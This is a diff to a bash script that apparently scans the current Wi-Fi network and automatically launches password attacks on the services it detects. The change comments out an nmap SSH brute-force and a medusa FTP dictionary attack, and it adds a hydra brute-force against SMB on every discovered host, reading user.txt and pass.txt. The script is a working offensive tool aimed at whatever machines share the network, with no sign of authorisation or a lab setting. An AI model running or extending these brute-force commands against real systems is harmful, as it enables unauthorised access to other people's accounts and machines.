@@ -1,10 +1,10 @@
 #!/bin/bash
 
-printf "[i] Checking network connection..."
+printf "[i] Checking network connection...\n"
 
 if ! ping -q -c1 google.com &>/dev/null
 then
-    printf "[!] No network! Aborting..." && exit
+    printf "[!] No network! Aborting...\n" && exit
 fi
 
 network_ssid=$(iwgetid -r)
@@ -78,7 +78,7 @@ do
             elif [ "${ports[$y]}" == "22" ]
             then 
                 printf "[i] \e[92mSSH\e[0m service detected!\n"
-                nmap -p 22 "${ips[$i]}" --script ssh-brute --script-args userdb=user.txt,passdb=pass.txt
+                # nmap -p 22 "${ips[$i]}" --script ssh-brute --script-args userdb=user.txt,passdb=pass.txt
 
 
             elif [ "${ports[$y]}" == "443" ]
@@ -90,11 +90,18 @@ do
                 printf "[i] \e[92mFTP\e[0m service detected!\n"
                 # hydra -l admin -P $wordlist-I -t 4 "${ips[$i]}" ftp
                 #default dictionary attack
-                medusa -h "${ips[$i]}" -u admin -P $wordlist -M ftp
+                # medusa -h "${ips[$i]}" -u admin -P $wordlist -M ftp
+
+                
 
             elif [ "${ports[$y]}" == "23" ]
             then 
                 printf "[i] \e[92mTELNET\e[0m service detected!\n"
+            elif [ "${ports[$y]}" == "445" ]
+
+            then 
+                printf "[i] \e[92mSMB\e[0m service detected!\n"
+                hydra -t 1 -V -f -L user.txt -P pass.txt "${ips[$i]}" smb
 
             else
                 printf "[!] Service on port \e[94m%s${ports[$y]}\e[0m is not supported yet! Skipping...\n"
